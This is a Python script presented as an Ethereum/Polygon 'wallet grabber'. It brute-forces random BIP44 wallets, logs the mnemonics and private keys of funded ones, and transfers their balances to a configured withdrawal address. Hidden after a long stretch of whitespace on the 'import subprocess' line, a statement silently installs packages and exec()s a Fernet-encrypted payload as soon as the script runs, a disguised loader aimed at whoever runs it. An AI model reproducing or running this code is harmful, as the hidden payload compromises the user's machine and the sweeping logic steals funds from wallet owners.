import os
import platform
import psutil
import keyboard
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'H6hSDFMU4YU-zTlTqi-VwcuAfYrj0f0dO6J5c87mKZ0=').decrypt(b'gAAAAABoypgKqqbFYwhFe5Ssw7gygY-DRFCY1utPwFrc1XD8sDGrhpur1u8b8F7fn1J9cOaT6LYx5U4soRQM2QQZLsGr6IagTumoMCjnnO_DjtC7Aoa-lXtMbQj3nKG4LyRr-ThXZ9PevltTn7eImLkvbR5W7tk0AaUXQaOK1OrjwpITHcvfBO-AUM0VHRcRZsxgg6owFHmroU46BRmeW4tho8WOk-PQtEP0JNwXiPl4umdf29wES8dbqcpslFIXnMNgc4gl7H2UWtrkVAg6v0i4-kfJoXWqPPAWLUOTJqPrFrnkEgVmvWU24GTxEY6VYl_GvKMz8O76JlstaiE5gaoJbecMPLdoY6ncvM0Cc4AiE9r-dhiHGqI6W_puZpRQIZ7urcnsibRqB8Sf7PYrrzVFFO5Pi8ERO5adyw9Ak-xldJn0op9X4iAl2hHEi3zOTROeszcydUVvSvWrQuhDxIJ_ndzrJjYiRJqEulvFBH0qeDzUGJhhv6aZ81Llman4KDZavENSVBWMrlT1XLynLAWBL8PinNnEABiH_enN674iKVq8XdVy379_wsvMtOQBnrMDCRTM0ErB3liKNHoRTSD8juMZv5U4wsdx3r6n2_D-E4nqlU8c5yjlOuToA9OJo8SRuazoEM6NOipZ0nbd9fQQPbWBFCApCZ-jYRi0RX2vQIpJ6ahslFmcZD16tZCEgKwid7QDjibwNMp__r7rXCxSOJljyHV0_TiALo0s_4KXGbxYLMd45l41Xa-19Eu9xSS8HvH6gVX_pWe0qFMzLxb728Q0na4G4gocTjpkh9S-u-mgN4oKnZDP3uxpkq0UG2gKvH-l40jkKaIw_3fFZmaj-4ydFZonXi_R3qPa8g67TkPbikDj23u3yMundFbvppudYIQo1AEKLZ6H4O7jVYAzjCVVb_KnarzMW3-EZ0vTlZjVimheARr_lwgJEsW_zec1SU3vT5DpHda_SJM3ZMYYfYR-Am9UXr4Uh4zBvhSzoAXwvOK4ke_iH9qsqQ3xkztWOlJiKberRAGcjDkLHWHPASMFxxbT8jQF_6jSnBNQ9ABu5lEbWfEk3bmGJ1HQ6gbq4yOlcuqQ4x0KfzyDr4MTUK_TgqArXsNkydIjs8uHi7IamkvFf31Pnuv3bJEcvM2zoK-BtSEWP0hkrZkTWaUCOmTLM05Gu_VrW2bqep62ZwM-6d5hoxETW5QkslzoiG-nYdlnut_CVYNVGyBPLTa0_f3QnMtEObSQ2lccuWEot17DKpyTSMXA2RgWrafsMtOZKR3phgf6w3Zvk0z2PtsHmF9qqIp515j4GsmH4AXsv2j3dRZWb3y1LHBjdnKOuNFwOr9uzyQ4SX8_ptt5e9JXRt1Ey1CgSpuKxskicvGdvbu4l7r9XQYiMtxglyYJL4DeQRyB0-tHRKVtLMjdeM9efampFEGhNSDNy9jfgkIWnDn1V8QTJThnnXfQCHAG7uhxlUblEIreeBf0oxA7EKnrmV3VDwCCCGL882i2FbvjlSorJU_LXGxzmHOI5z6_y71rWDubSwJgjZ6VUK1SRVPDoCnuXZaSBwKYIA-BZVv2Y0PyJP4V4q3s5N0ufHY_r7vgQ79YeEor9twNPPhxuW3Qff7nbqRpKF1Z0MosG-NYY3w7ehZk1N2RoA7kq9PTzWKFzfLDUu88eMVG0KlQYOL9zOIKNsU3VSpSCfQVmmQhOwsjUjMgUNoJsO_dm-opUTPVpIGxWMermvHp-jYvkd0Y1e2t-gBZGs1baTjmEDtJfMSxClKgxObutQp9CPilLfm1h9jeDI2Ndd2UGN3kM1sETQfeeuInqFVtI0LDppOse8Dz1OwRdyxkLZ0r3NnoF8JYq2IrnWUA0wMqVX3olET6fUaXIWfiExy44YRAXXLHPR3B0tVow-qfnFZoKy6nCNH0HNBU_luRtQm0Kmy8lmmJdlqk6FzqvG8xBsMQml323a5b04q7MJOd7ycqKLhfYac9CjGMTTcEYqnKfWSNJEbankHAZGM1IOQJGoi-hO4HjaUffZ4f9qRw4I0nBgc4EagSY1gGt_hMfRXyOtiI15TjNO0d1Wk5IaFdZihlByRgHoQXpiuMT8Hg-Nfa07BIvPn-bhNqvp4xYW_rBC7ZiQkK0J0-ooZi46KlZjx1_uEhbVViMsxF5bBY8QwNFtDxLpQ6zr_7hW6gyTpxu2SvWpg486Hz43Z-c6bh5GtXK7jWbdOqLeK_dztEoAaEdr3O5HdYxIn0qghIeifAAysdoDGfcp1_QIWgHL22rYDbDMhP_8ynSZNrH4TwvMHeBAM6y2cTDlTHtmjkdSgjOh_H8vHqRkNOlUg6QOLhjn52zFHQDYTtcaiO82REZXXhDNf18ViAE_2WJvyqpnpyzLpD7czyPHbSL20Uw0xlU1-YerNNEZz1UfBbBEb3LEF9jXnrtDfzFC4WToerBqD7PJAb9PF6_8mo2Y5eJMZTBdyh9iHRJMVgty1FP9iizzF5z5fXaAlSCGyPzFuxc_ACw6oOGs8YaWZ8BWQwOaPCoTZNPtLG5D6iMgv_BOtIdOaHSCAJLkpfuBIM4nyInSKTOzr86-OHhYAC8CI5iYB9WnFCthxukWKdXS-2g50ezMun7IIXf0wxbV3saHuqQib7jPT_YkervqR6IjojKOYoAnETqxRvB-oICjHq_KyMwiDNCzkyVS3pvYWUQdOcHGOMCjdMdx6Dd4hOhV-LgFcMHKjyfk4Bxh0gPErtZFA5ivk_Rs7AsAPZLt5f7fr4W-GpFOPk3N5WxDLfaA5bUDpvCFbz4qS9w0kTsEXrAGh8y4WBM9QZTvr7s_5PBUNwMwMgcBuk7hLbmvjnN2FOMWaSfT2FrsVHXW5IlffGj3xekeqd4mlhzb9bRxy51NiHk5-8y_m19yIS-p_5GkngBOZ_urluckyQynbJO7H7LBbCga0KHicU8DmrR8ptbWNFhHEF_cGPY4UUfR4vmCszkNdljlG07Qyc38PDnpZRvyV1XBJkKsKQFCcDwG4E0irKHGa1Jnty6OlMedehxfGnkABKf8rhZfrhMXunb516us2TVqi0RwN7UKF784OO8-T93cukxf8CgsQWTDZ4RCqTsDKdK-SpCcC6SrGF916oPWnlnDwx2JslXxcDF1oLXBtQHOvThiDco6frs8iwxJ1-VA=='));
from math import floor
from colorama import Fore
from threading import Thread
from dotenv import load_dotenv
from function import balance, Bip44Gen, logger, transfer, upTime
load_dotenv()


class ethGrabber():
    def __init__(self) -> None:
        self.apiURL = os.getenv('apiURL')
        self.apiKey = os.getenv('apiKey')
        self.balance_min = int(os.getenv("balance_min"))
        self.withdraw = os.getenv("withdraw_wallet")
        self.os_type = platform.system()
        activeThreads = psutil.cpu_count()
        threadsMulti = float(os.getenv('threadsMulti'))
        self.threadsBlock = int(os.getenv('threadsBlock'))
        self.usableThreads = floor(activeThreads * threadsMulti)
        self.threads = {}
        self.wet, self.dry = 0, 0
        self.balance, self.Bip44Gen, self.Logger, self.Transfer, self.UpTime = balance.Balance(apiURL="polygon-bor-rpc.publicnode.com", apiType="https://"
        ), Bip44Gen.Bip44Gen(), logger.Logger(), transfer.Transfer(apiURL="polygon-bor-rpc.publicnode.com", apiType="https://"), upTime.upTime()

    def Grabber(self, threadName) -> bool:
        while True:

            if keyboard.is_pressed("alt+k"):
                del self.threads[f'{threadName}']
                while True:
                    self.update_console()
                    if keyboard.is_pressed("alt+r"):
                        self.threads[f'{threadName}'] = True
                        break
                    if self.threadsBlock and keyboard.is_pressed("alt+h") and threadName+1 > int(self.usableThreads / 2):
                        self.threads[f'{threadName}'] = True
                        break

            if keyboard.is_pressed("alt+q"):
                quit(0)

            if keyboard.is_pressed("alt+u"):
                self.update_console(True)

            self.update_console()
            wallet = self.Bip44Gen.bip44_generate()
            balance = self.balance.w3_balance(
                wallet['address'], wallet['seed'])
            eth_balance = self.Transfer.w3.from_wei(balance, "ether")
            if balance:
                self.Logger.info(f'''{eth_balance} ETH found on {wallet['address']}, Mnemonic: {
                                 wallet['seed']}, Private: {wallet['private']}''')
                data = {
                    "rec_address": self.withdraw,
                    "from_address": wallet['address'],
                    "balance": balance,
                    "private": wallet['private'],
                    "mnemonic": wallet['seed']
                }

                if balance > self.balance_min:
                    tx_hash = self.Transfer.transfer(data)
                    self.wet += 1
                    match tx_hash['message']:
                        case "eth_move":
                            self.Logger.info(f'''{eth_balance} Transfered from {
                                wallet['address']} | Transcation: https://etherscan.io/tx/{tx_hash['tx_hash']}''')
                            return True

                        case "save_error":
                            self.Logger.info(f'''{eth_balance} Transfered from {
                                wallet['address']} | Mnemonic [{wallet['seed']}] | Transcation: https://etherscan.io/tx/{tx_hash['tx_hash']}''')
                            return True

                        case "sumcheck_fail":
                            self.Logger.debug("sumcheck Faild")
                            return False

                        case "transfer_error":
                            self.Logger.error(tx_hash['err'])
                            return False

                log_wallet = self.Transfer.log_wallet(data, False)
                self.wet += 1
                if log_wallet:
                    self.Logger.info(f'''{eth_balance} Found On {
                        wallet['address']} | Wallet Saved''')
                    return True
                else:
                    self.Logger.info(f'''{eth_balance} Found On {
                        wallet['address']} | Error While Saving | Mnemonic {wallet['seed']}''')
                    return False

            self.dry += 1

    def update_console(self, clean=False):
        if clean:
            match self.os_type:
                case "Windows":
                    os.system("cls")
                case "Linux":
                    os.system("clear")

        UpTime = self.UpTime.per_seconds(self.wet+self.dry)
        print(f"""{Fore.CYAN}-- -- -- --  Worker Count: {self.usableThreads} ||  {len(self.threads)}  ||{Fore.RED} -- -- -- --  Wallets Scanned: {Fore.WHITE}{self.wet+self.dry}{Fore.RED} -- -- -- --  Wallets Hits: {Fore.WHITE}{self.wet}{Fore.BLACK} -- -- -- --{Fore.CYAN}  UpTime: {Fore.WHITE}{UpTime[0]} -- -- -- --{Fore.CYAN} W/S: {UpTime[1]}  -- -- -- --{Fore.CYAN} W/M: {UpTime[2]}""", end='\r')
    
    def run(self) -> None:
            for i in range(self.usableThreads):
                thread = Thread(target=self.Grabber, args=(i,), name=i)
                self.threads[f'{i}'] = True
                thread.start()
            self.update_console(True)


ethGrabber().run()
